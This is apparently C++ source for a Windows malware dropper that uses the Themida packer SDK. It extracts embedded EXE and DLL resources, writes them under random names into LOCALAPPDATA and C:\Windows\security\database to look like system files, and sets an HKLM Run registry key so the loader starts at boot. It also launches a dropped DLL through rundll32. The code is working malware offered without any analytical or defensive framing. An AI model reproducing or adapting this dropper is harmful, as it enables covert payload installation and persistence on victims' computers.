#include <Windows.h>
#include <string>
#include "ThemidaSDK.h"
#include "resource.h"

void cpy3() {
    WCHAR* buffer = new WCHAR[260];
    const WCHAR name[13] = L"LOCALAPPDATA";
    DWORD desktop = GetEnvironmentVariable(name, buffer, 260);
    std::wstring fullpath1;
    fullpath1 += buffer;
    fullpath1 += L"\\loader2.exe";
    LPCWSTR cont1 = fullpath1.c_str();
    HRSRC hResInfo = FindResource(NULL, MAKEINTRESOURCE(IDR_EXE1), TEXT("EXE"));
    HGLOBAL hRes = LoadResource(NULL, hResInfo);
    LPVOID memRes = LockResource(hRes);
    DWORD sizeRes = SizeofResource(NULL, hResInfo);
    HANDLE hFile = CreateFile(cont1, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD dwWritten = 0;
    WriteFile(hFile, memRes, sizeRes, &dwWritten, NULL);
    CloseHandle(hFile);
    CopyFile(
        cont1,
        TEXT("C:\\Windows\\security\\database\\loader2.exe"),
        FALSE
    );
}

void cpy2() {
    WCHAR* buffer = new WCHAR[260];
    const WCHAR name[13] = L"LOCALAPPDATA";
    DWORD desktop = GetEnvironmentVariable(name, buffer, 260);
    std::wstring fullpath1;
    fullpath1 += buffer;
    fullpath1 += L"\\klzfNjYkTazNJpKNvBkL.dll";
    LPCWSTR cont1 = fullpath1.c_str();
    HRSRC hResInfo = FindResource(NULL, MAKEINTRESOURCE(IDR_DLL2), TEXT("DLL"));
    HGLOBAL hRes = LoadResource(NULL, hResInfo);
    LPVOID memRes = LockResource(hRes);
    DWORD sizeRes = SizeofResource(NULL, hResInfo);
    HANDLE hFile = CreateFile(cont1, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD dwWritten = 0;
    WriteFile(hFile, memRes, sizeRes, &dwWritten, NULL);
    CloseHandle(hFile);
    CopyFile(
        cont1,
        TEXT("C:\\Windows\\security\\database\\klzfNjYkTazNJpKNvBkL.dll"),
        FALSE
    );
}


void cpy1() {
    WCHAR* buffer = new WCHAR[260];
    const WCHAR name[13] = L"LOCALAPPDATA";
    DWORD desktop = GetEnvironmentVariable(name, buffer, 260);
    std::wstring fullpath1;
    fullpath1 += buffer;
    fullpath1 += L"\\ILOVEYUUKA.dll";
    LPCWSTR cont1 = fullpath1.c_str();
    HRSRC hResInfo = FindResource(NULL, MAKEINTRESOURCE(IDR_DLL1), TEXT("DLL"));
    HGLOBAL hRes = LoadResource(NULL, hResInfo);
    LPVOID memRes = LockResource(hRes);
    DWORD sizeRes = SizeofResource(NULL, hResInfo);
    HANDLE hFile = CreateFile(cont1, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD dwWritten = 0;
    WriteFile(hFile, memRes, sizeRes, &dwWritten, NULL);
    CloseHandle(hFile);
    CopyFile(
        cont1,
        TEXT("C:\\Windows\\security\\database\\cLHmKpngPKJeIIDxXeFq.dll"),
        FALSE
    );
}


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    WCHAR* buffer = new WCHAR[260];
    const WCHAR name[13] = L"LOCALAPPDATA";
    DWORD desktop = GetEnvironmentVariable(name, buffer, 260);
    std::wstring fullpath1;
    fullpath1 += buffer;
    fullpath1 += L"\\lAiaUFyKHYphOZsGSMZv.dll";
    LPCWSTR cont1 = fullpath1.c_str();
    HRSRC hResInfo = FindResource(NULL, MAKEINTRESOURCE(IDR_DLL3), TEXT("DLL"));
    HGLOBAL hRes = LoadResource(NULL, hResInfo);
    LPVOID memRes = LockResource(hRes);
    DWORD sizeRes = SizeofResource(NULL, hResInfo);
    HANDLE hFile = CreateFile(cont1, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD dwWritten = 0;
    WriteFile(hFile, memRes, sizeRes, &dwWritten, NULL);
    CloseHandle(hFile);
    CopyFile(
        cont1,
        TEXT("C:\\Windows\\security\\database\\lAiaUFyKHYphOZsGSMZv.dll"),
        FALSE
    );
    cpy1();
    cpy2();
    cpy3();
    LONG status;
    HKEY hKey;
    const wchar_t path[] = L"\"C:\\Windows\\security\\database\\loader2.exe\"";
    status = RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_ALL_ACCESS, &hKey);
    if ((status == ERROR_SUCCESS) && (hKey != NULL))
    {
        RegSetValueEx(hKey, TEXT("FezDzUXWVHbPPXBpqqoD"), 0, REG_SZ, (BYTE*) path, sizeof(path));
        RegCloseKey(hKey);
    }
    ShellExecute(
        NULL,
        TEXT("open"),
        TEXT("cmd"),
        L"/c rundll32 C:\\Windows\\security\\database\\lAiaUFyKHYphOZsGSMZv.dll, message",
        NULL,
        SW_NORMAL
    );
    return 0;
}

	